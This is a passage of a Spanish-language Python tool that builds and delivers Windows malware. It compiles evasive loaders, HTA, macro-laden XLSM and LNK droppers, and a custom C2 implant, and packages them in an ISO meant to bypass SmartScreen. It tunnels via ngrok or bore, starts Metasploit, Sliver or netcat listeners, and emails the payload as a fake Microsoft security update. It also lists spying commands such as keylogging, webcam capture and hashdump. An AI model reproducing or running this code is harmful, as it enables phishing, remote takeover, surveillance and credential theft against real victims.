    subprocess.run(["fuser","-k",f"{puerto}/tcp"],capture_output=True,check=False)
    time.sleep(0.4); os.chdir(carpeta)
    class H(http.server.SimpleHTTPRequestHandler):
        def log_message(self,fmt,*args):
            if args and "200" in str(args[0]):
                print(f"\n  {G}[HIT]{X}  {B}Descarga desde {self.address_string()}{X}")
        def log_error(self,*a): pass
    class S(socketserver.TCPServer):
        allow_reuse_address=True
        def handle_error(self,*a): pass
    with S(("",puerto),H) as httpd:
        if cert_path and os.path.exists(cert_path):
            try:
                ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.check_hostname=False
                ctx.load_cert_chain(cert_path)
                httpd.socket=ctx.wrap_socket(httpd.socket,server_side=True)
            except Exception as e:
                warn(f"SSL no disponible, usando HTTP: {e}")
        httpd.serve_forever()

def _enviar_email_payload(ruta_adjunto,nombre_adjunto):
    import smtplib,getpass
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from email.mime.text import MIMEText
    from email import encoders
    print(f"\n  {D}Email atacante (Gmail):{X} ",end=""); from_email=input().strip()
    print(f"  {D}App Password:{X}  ",end=""); password=getpass.getpass("")
    print(f"  {D}Email victima:{X}  ",end=""); to_email=input().strip()
    print(f"  {D}Asunto [Enter=default]:{X}  ",end="")
    asunto=input().strip() or "Actualizacion critica KB5041001 — Accion requerida"
    cuerpo=(f"Estimado usuario,\n\nActualizacion de seguridad critica disponible.\n"
            f"Contrasena del archivo: {ZIP_PASSWORD}\n\n"
            "Instrucciones:\n  1. Descargue el adjunto\n  2. Extraiga con la contrasena\n"
            "  3. Monte el ISO y ejecute el instalador\n\nMicrosoft Security Response Center\n")
    msg=MIMEMultipart(); msg["From"]=from_email; msg["To"]=to_email; msg["Subject"]=asunto
    msg.attach(MIMEText(cuerpo,"plain"))
    with open(ruta_adjunto,"rb") as f:
        part=MIMEBase("application","octet-stream"); part.set_payload(f.read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition",f'attachment; filename="{nombre_adjunto}"')
    msg.attach(part)
    try:
        s=smtplib.SMTP("smtp.gmail.com",587); s.ehlo(); s.starttls()
        s.login(from_email,password); s.sendmail(from_email,to_email,msg.as_string()); s.quit()
        ok(f"Email enviado a {B}{to_email}{X}")
    except smtplib.SMTPAuthenticationError: warn("Auth fallo — usa App Password")
    except Exception as e: warn(f"Error: {e}")

# ──────────────────────────────────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────────────────────────────────

def main():
    boot_sequence(); banner(animado=True)
    carpeta=os.path.dirname(os.path.abspath(__file__))
    ruta_rc=os.path.join(carpeta,ARCHIVO_RC)

    misma_red,metodo_tunel=preguntar_red()
    nombre_base,opcion    =preguntar_nombre_y_formato()
    # LIBRECRI (opcion 6) no necesita backend C2 — tiene el suyo propio
    if opcion != "6":
        backend_c2 = preguntar_backend_c2()
    else:
        backend_c2 = "librecri"

    # ── Sliver setup ──────────────────────────────────────────────────────────
    if backend_c2=="2":
        os.system("clear"); banner(animado=False)
        titulo_seccion("SLIVER C2 — SETUP")
        cli_bin=_sliver_find_binary(["sliver-client","sliver"])
        if cli_bin:
            ok(f"Sliver instalado {D}({cli_bin}){X}")
        else:
            r_sc=subprocess.run(["systemctl","status","sliver"],capture_output=True,text=True)
            if r_sc.returncode!=4:
                ok(f"Sliver instalado {D}(via systemd){X}")
            else:
                info("Instalando Sliver (~2 min)...")
                subprocess.run("curl -sSf https://sliver.sh/install | sudo bash",shell=True)
                if _sliver_find_binary(["sliver-client","sliver"]): ok("Sliver instalado")
                else: err_fatal("No se pudo instalar Sliver.")
        _sudo_cache_credentials()
        con_spinner("Arrancando sliver-server...",_arrancar_sliver_server)
        ok("sliver-server activo")

    os.system("clear"); banner(animado=False)

    # ── Red ───────────────────────────────────────────────────────────────────
    titulo_seccion("01 / RED")
    proc_ngrok=None; proc_bore_http=None; url_servidor=None

    if misma_red:
        ip=con_spinner("Detectando IP...",obtener_ip_local)
        if not ip: err_fatal("No se detecto IP local.")
        ok(f"IP local: {B}{ip}{X}")
        lhost=ip; lport=PUERTO_PAYLOAD; url_servidor=f"http://{ip}:{PUERTO_HTTP}"

    elif metodo_tunel=="ngrok":
        if not verificar_ngrok():
            if not instalar_ngrok(): err_fatal("No se pudo instalar ngrok.")
            ok("ngrok instalado")
        while True:
            print(f"\n  {W}Token ngrok:{X} {D}(dashboard.ngrok.com){X}\n")
            token=input(f"  {D}> {X}").strip()
            if not token: warn("Ingresa el token."); continue
            if con_spinner("Configurando...",configurar_token,token): ok("Token OK"); break
            warn("Token invalido.")
        ruta_cfg=os.path.join(carpeta,"_ngrok_expo.yml"); generar_config_ngrok(ruta_cfg)
        while True:
            url_http,ngrok_host,ngrok_port,proc_ngrok=con_spinner("Iniciando ngrok...",iniciar_ngrok,ruta_cfg)
            if url_http and ngrok_host: break
            if input(f"  {D}  Reintentar? (s/n): {X}").strip().lower()!="s": err_fatal("Sin ngrok.")
        ok(f"HTTP: {B}{url_http}{X}"); ok(f"TCP: {B}{ngrok_host}:{ngrok_port}{X}")
        lhost=ngrok_host; lport=ngrok_port; url_servidor=url_http

    else:
        ruta_bore=con_spinner("Preparando bore.pub...",instalar_bore,carpeta)
        if not ruta_bore: err_fatal("No se pudo descargar bore.")
        ok("bore listo")
        while True:
            bore_tcp,proc_bore_tcp=con_spinner("Tunel TCP...",iniciar_bore_tunel,ruta_bore,PUERTO_PAYLOAD)
            if bore_tcp: break
            if input(f"  {D}  Reintentar? (s/n): {X}").strip().lower()!="s": err_fatal("Sin TCP.")
        ok(f"TCP: {B}bore.pub:{bore_tcp}{X}")
        while True:
            bore_http,proc_bore_http=con_spinner("Tunel HTTP...",iniciar_bore_tunel,ruta_bore,PUERTO_HTTP)
            if bore_http: break
            if input(f"  {D}  Reintentar? (s/n): {X}").strip().lower()!="s": err_fatal("Sin HTTP.")
        ok(f"HTTP: {B}http://bore.pub:{bore_http}{X}")
        lhost="bore.pub"; lport=bore_tcp
        url_servidor=f"http://bore.pub:{bore_http}"
        proc_ngrok=proc_bore_tcp

    url_exe_http=f"{url_servidor}/{nombre_base}.exe"

    # ── Payload ───────────────────────────────────────────────────────────────
    if opcion != "6":
        titulo_seccion("02 / GENERACION DE PAYLOAD")
        be_labels={"1":"Meterpreter","2":"Shell Custom (nc)","3":"Sliver C2"}
        be_label=be_labels.get(backend_c2,"Meterpreter")
        info(f"Backend: {B}{be_label}{X}  |  Loader: IAT limpia + PEB walk + Hell's Gate + EarlyBird APC")
        info(f"Targets: RuntimeBroker.exe > dllhost.exe > notepad.exe")

    def _gen_exe(nm):
        if backend_c2=="3": return _generar_loader_sliver(lhost,lport,carpeta,nm)
        elif backend_c2=="2": return _generar_loader_shell_nc(lhost,lport,carpeta,nm)
        else:               return _generar_loader_custom(lhost,lport,carpeta,nm)

    ruta_archivo=None; nombre_archivo=""

    if opcion=="1":
        nombre_archivo=f"{nombre_base}.exe"
        ruta_archivo=os.path.join(carpeta,nombre_archivo)
        if not con_spinner(f"Compilando {nombre_archivo}...",_gen_exe,nombre_archivo):
            err_fatal("Fallo compilacion. Verifica msfvenom/Sliver y mingw-w64.")
        ok(f"{B}{nombre_archivo}{X}  — IAT limpia, PEB walk, strings XOR, Hell's Gate")

    elif opcion=="2":
        exe_tmp="_payload_tmp.exe"
        if not con_spinner("Compilando exe base...",_gen_exe,exe_tmp):
            err_fatal("Fallo compilacion exe base.")
        ok("Exe base listo")
        ruta_exe_tmp=os.path.join(carpeta,exe_tmp)
        ruta_msi=con_spinner("Generando instalador NSIS...",_generar_msi_nsis,ruta_exe_tmp,carpeta,nombre_base)
        if os.path.exists(ruta_exe_tmp): os.remove(ruta_exe_tmp)
        if not ruta_msi: err_fatal("NSIS fallo: sudo apt install nsis -y")
        nombre_archivo=os.path.basename(ruta_msi); ruta_archivo=ruta_msi
        ok(f"{B}{nombre_archivo}{X}  — instalador silencioso, extrae en %TEMP%")

    elif opcion=="3":
        exe_srv=f"{nombre_base}.exe"
        if not con_spinner(f"Compilando exe para servidor...",_gen_exe,exe_srv):
            err_fatal("Fallo compilacion exe.")
        ok(f"Exe listo: {D}{url_exe_http}{X}")
        ruta_hta=con_spinner("Generando HTA dropper...",_generar_hta,url_exe_http,carpeta,nombre_base)
        if not ruta_hta: err_fatal("Fallo HTA.")
        nombre_archivo=os.path.basename(ruta_hta); ruta_archivo=ruta_hta
        ok(f"{B}{nombre_archivo}{X}  — AMSI bypass VBScript + XMLHTTP download + exec")

    elif opcion=="4":
        exe_srv=f"{nombre_base}.exe"
        if not con_spinner(f"Compilando exe para servidor...",_gen_exe,exe_srv):
            err_fatal("Fallo compilacion exe.")
        ok(f"Exe listo: {D}{url_exe_http}{X}")
        ruta_xl=con_spinner("Generando XLSM con macro VBA...",_generar_xlsm_vba,url_exe_http,carpeta,nombre_base)
        if not ruta_xl: err_fatal("Fallo XLSM.")
        nombre_archivo=os.path.basename(ruta_xl); ruta_archivo=ruta_xl
        ok(f"{B}{nombre_archivo}{X}  — VBA Workbook_Open + AMSI bypass + XMLHTTP download")
        warn("Victima debe habilitar macros (barra amarilla de Excel)")

    elif opcion=="5":
        exe_srv=f"{nombre_base}.exe"
        if not con_spinner(f"Compilando exe para servidor...",_gen_exe,exe_srv):
            err_fatal("Fallo compilacion exe.")
        ok(f"Exe listo: {D}{url_exe_http}{X}")
        ruta_lnk=con_spinner("Generando .lnk shortcut...",_generar_lnk,url_exe_http,carpeta,nombre_base)
        if not ruta_lnk: err_fatal("Fallo LNK.")
        nombre_archivo=os.path.basename(ruta_lnk); ruta_archivo=ruta_lnk
        ok(f"{B}{nombre_archivo}{X}  — Shell Link binario, PS download+exec, <1% deteccion AV")
        info("Doble clic → PowerShell silencioso descarga y ejecuta el exe")

    elif opcion=="6":
        titulo_seccion("02 / LIBRECRI — EXE UNICO SIN FIRMAS")
        info("Stack: C GCC constructor + PEB walk DJB2 + IAT solo imports inocentes")
        info("       IAT: comctl32/crypt32/version/winmm/imm32 (camuflaje)")
        info("       winsock + CreateProcess: resueltos en runtime, ZERO firma estatica")
        info("Protocolo HTTP/1.0 polling: GET /cmd · POST /res (XOR per-build)")
        _gcc_ok = bool(shutil.which("x86_64-w64-mingw32-gcc"))
        _go_ok  = bool(shutil.which("go"))
        if _gcc_ok:
            ruta_archivo=con_spinner("Compilando LIBRECRI C HTTP (~10s)...",
                                     _generar_librecri_c_http, lhost, lport, carpeta, nombre_base)
            if not ruta_archivo or not os.path.exists(ruta_archivo):
                warn("C HTTP fallo — intentando Go fallback...")
                if _go_ok:
                    ruta_archivo=con_spinner("Compilando LIBRECRI Go (~30s)...",
                                             _generar_librecri_go, lhost, lport, carpeta, nombre_base)
                if not ruta_archivo or not os.path.exists(ruta_archivo):
                    ruta_archivo=con_spinner("Compilando LIBRECRI C TCP (fallback)...",
                                             _generar_librecri, lhost, lport, carpeta, nombre_base)
        elif _go_ok:
            warn("mingw64 no encontrado — usando Go (mas detectable)...")
            warn("Instala: sudo apt install mingw-w64 -y")
            ruta_archivo=con_spinner("Compilando LIBRECRI Go (~30s)...",
                                     _generar_librecri_go, lhost, lport, carpeta, nombre_base)
            if not ruta_archivo or not os.path.exists(ruta_archivo):
                ruta_archivo=con_spinner("Compilando LIBRECRI C TCP (fallback)...",
                                         _generar_librecri, lhost, lport, carpeta, nombre_base)
        else:
            err_fatal("Necesitas mingw-w64: sudo apt install mingw-w64 -y")
        if not ruta_archivo or not os.path.exists(ruta_archivo):
            err_fatal("LIBRECRI fallo. Verifica: sudo apt install mingw-w64 golang-go -y")
        nombre_archivo = os.path.basename(ruta_archivo)
        ok(f"{B}{nombre_archivo}{X}  — {os.path.getsize(ruta_archivo)//1024} KB")
        ok(f"c2_server.py  — listo en {carpeta}")
        print(f"\n  {W}Como funciona:{X}")
        print(f"  {D}1. Victima descarga y ejecuta  {B}{nombre_archivo}{X}")
        print(f"  {D}2. Constructor GCC corre antes de WinMain — sin TLS directory en PE{X}")
        print(f"  {D}3. Jitter 500-1100ms + timing check anti-sandbox{X}")
        print(f"  {D}4. Conecta al C2 — sesion aparece en {B}c2_server.py{X}")

    # ── ISO + ZIP (no aplica para DLL hijack — se entrega la carpeta completa) ──
    ruta_iso=None; ruta_zip=None
    if opcion!="6":
        titulo_seccion("02.5 / DELIVERY")
        ruta_iso=con_spinner("Generando ISO (bypass MOTW/SmartScreen)...",
                             _generar_iso,ruta_archivo,carpeta,nombre_base)
        if ruta_iso: ok(f"ISO: {B}{os.path.basename(ruta_iso)}{X}  — sin Mark-of-the-Web")
        else: warn("genisoimage no encontrado: sudo apt install genisoimage -y")

        ruta_zip=con_spinner(f"ZIP cifrado (pwd: {ZIP_PASSWORD})...",
                             _generar_zip_password,ruta_archivo,carpeta,nombre_base)
        if ruta_zip: ok(f"ZIP: {B}{os.path.basename(ruta_zip)}{X}  pwd={Y}{ZIP_PASSWORD}{X}")
        else: warn("7z no encontrado: sudo apt install p7zip-full -y")
        print()
        if ruta_iso and ruta_zip:
            ok("Estrategia optima:")
            info(f"1. Manda ZIP por correo  {D}({os.path.basename(ruta_zip)}){X}")
            info(f"2. Password: {Y}{ZIP_PASSWORD}{X}  (manda separado por WhatsApp)")
            info("3. Victima monta ISO (doble clic en Win10/11)")
            info("4. Ejecuta desde ISO montado — sin SmartScreen")

    # ── Listener ──────────────────────────────────────────────────────────────
    if opcion=="6":
        titulo_seccion("03 / C2 — ARRANCANDO SERVIDOR")
        _srv_py = os.path.join(carpeta, "c2_server.py")
        if not os.path.exists(_srv_py):
            err_fatal("c2_server.py no encontrado — regenera con generador.py")
        ok(f"Abriendo C2 en nueva terminal (puerto {lport}) + file server (8080)...")
        print(f"  {D}Victima descarga: {B}http://{lhost}:8080/{nombre_base}.exe{X}\n")
        import sys as _sys, shutil as _sh, subprocess as _sp
        _cmd_str  = f"{_sys.executable} {_srv_py}"
        _bash_cmd = f"bash -c '{_cmd_str}; echo; read -p \"[ENTER para cerrar]\"; exec bash'"
        _env      = os.environ.copy()
        _env.setdefault("DISPLAY", ":0")
        _launched = False
        for _term, _args in [
            ("xfce4-terminal", ["xfce4-terminal", "-T", "LIBRECRI C2", "-e", _bash_cmd]),
            ("x-terminal-emulator", ["x-terminal-emulator", "-e", _bash_cmd]),
            ("xterm",          ["xterm",          "-title", "LIBRECRI C2", "-e", _bash_cmd]),
            ("gnome-terminal", ["gnome-terminal", "--title=LIBRECRI C2", "--", "bash", "-c", _cmd_str]),
            ("lxterminal",     ["lxterminal",     "-t", "LIBRECRI C2", "-e", _bash_cmd]),
            ("konsole",        ["konsole",        "-e", _bash_cmd]),
        ]:
            if _sh.which(_term):
                try:
                    _sp.Popen(_args, env=_env)
                    _launched = True
                    ok(f"Terminal abierta: {_term}")
                    break
                except Exception as _ex:
                    warn(f"{_term} fallo: {_ex}"); continue
        if not _launched:
            warn("Sin terminal grafica — corriendo en foreground (Ctrl+C para salir)...")
            os.execv(_sys.executable, [_sys.executable, _srv_py])
    elif backend_c2=="3":
        titulo_seccion("03 / LISTENER — SLIVER C2")
        ok("sliver-server corriendo en background")
        print(f"\n  {W}En terminal nueva:{X}\n")
        print(f"  {B}sliver-client{X}\n")
        print(f"  {D}Dentro:{X}  {B}mtls --lhost 0.0.0.0 --lport {PUERTO_PAYLOAD}{X}")
        print(f"           {B}sessions{X}  /  {B}use <ID>{X}  /  {B}shell{X}\n")
    elif backend_c2=="2":
        titulo_seccion("03 / LISTENER — SHELL CUSTOM (NETCAT)")
        print(f"\n  {W}Corre esto en Kali para recibir la conexion:{X}\n")
        print(f"  {B}{G}  nc -lvnp {PUERTO_PAYLOAD}  {X}")
        print(f"\n  {D}Cuando la victima ejecute el archivo, aparece el shell:{X}")
        print(f"  {D}  C:\\Windows\\system32> _   {X}")
        print(f"\n  {D}Comandos utiles para la expo:{X}")
        for cmd,desc in [
            ("whoami",             "usuario actual"),
            ("hostname",           "nombre del equipo"),
            ("ipconfig",           "red del equipo"),
            ("systeminfo",         "info completa del sistema"),
            ("net user",           "usuarios del sistema"),
            ("tasklist",           "procesos corriendo"),
            ("dir C:\\Users",       "archivos de usuarios"),
            ("type C:\\Users\\...", "leer archivo"),
        ]: print(f"  {B}{cmd:<25}{X}  {D}{desc}{X}")
        print()
    else:
        titulo_seccion("03 / LISTENER — METASPLOIT")
        lhost_l="0.0.0.0" if not misma_red else lhost
        escribir_rc(lhost_l,PUERTO_PAYLOAD if not misma_red else lport,ruta_rc)
        terminal=abrir_metasploit(ruta_rc)
        if terminal: ok(f"Metasploit abierto en {D}{terminal}{X}")
        else:
            warn("No se pudo abrir terminal.")
            print(f"\n  Ejecuta: {B}msfconsole -r {ruta_rc}{X}\n")

    # ── Email ─────────────────────────────────────────────────────────────────
    titulo_seccion("04 / ENVIO POR CORREO")
    adjunto=ruta_zip or ruta_iso or ruta_archivo
    print(f"  {D}Adjunto:{X}  {B}{os.path.basename(adjunto)}{X}")
    print(f"  {D}(s) enviar ahora   (n) saltar{X}\n")
    if input(f"  {D}> {X}").strip().lower()=="s":
        _enviar_email_payload(adjunto,os.path.basename(adjunto))

    # ── Servidor ──────────────────────────────────────────────────────────────
    titulo_seccion("05 / SERVIDOR DE ARCHIVOS")
    # Siempre HTTP en el servidor de archivos — bore.pub es tunel TCP puro
    # y no puede pasar TLS. El HTTPS del proyecto va en el C2 (puerto 443).
    url_entrega=url_servidor
    hilo=threading.Thread(target=iniciar_servidor,args=(carpeta,PUERTO_HTTP),daemon=True)
    hilo.start(); time.sleep(1)
    ok(f"HTTP server activo en puerto {PUERTO_HTTP}")

    print(f"\n\n{D}  {'═'*54}{X}")
    print(f"  {B}{G}  SISTEMA LISTO — ESPERANDO CONEXION{X}")
    print(f"{D}  {'═'*54}{X}\n")
    print(f"  {D}URL para la victima:{X}\n")
    typewriter(f"       {url_entrega}",color=f"{B}{Y}",delay=0.03)
    print(f"\n  {D}Archivo:{X}  {B}{nombre_archivo}{X}")
    if opcion=="1":
        print(f"\n  {Y}[!!]{X}  Si Edge/Chrome bloquean el .exe:")
        print(f"       {D}► Click derecho en la descarga → 'Mantener' → 'Mantener de todas formas'{X}")
        print(f"       {D}► O desactiva SmartScreen: Inicio → Seg. Windows → App y navegador → OFF{X}")
    print(f"\n{D}  {'─'*54}{X}")
    for cmd,desc in [
        ("sessions -v","sesiones activas + fecha/hora exacta"),
        ("sessions -i 1","entrar a sesion 1"),
        ("sysinfo","info del sistema victima"),
        ("getuid","usuario actual"),
        ("getsystem","escalar a SYSTEM"),
        ("screenshot","captura pantalla en tiempo real"),
        ("webcam_snap","foto camara web"),
        ("keyscan_start","activar keylogger"),
        ("keyscan_dump","dump de teclas capturadas"),
        ("record_mic -d 10","grabar 10s de microfono"),
        ("hashdump","hashes de contrasenas"),
        ("download [ruta]","bajar archivo"),
        ("arp","otros equipos en la red"),
        ("shell","CMD directo de la victima"),
    ]: print(f"  {B}{cmd:<22}{X}  {D}{desc}{X}")
    print(f"\n{D}  {'─'*54}{X}")
    print(f"  {D}Ctrl+C para cerrar{X}\n")

    try:
        while True: hilo.join(timeout=1)
    except KeyboardInterrupt:
        if proc_ngrok: proc_ngrok.terminate()
        if proc_bore_http: proc_bore_http.terminate()
        print(f"\n  {D}Cerrando...{X}\n")

if __name__=="__main__":
    main()
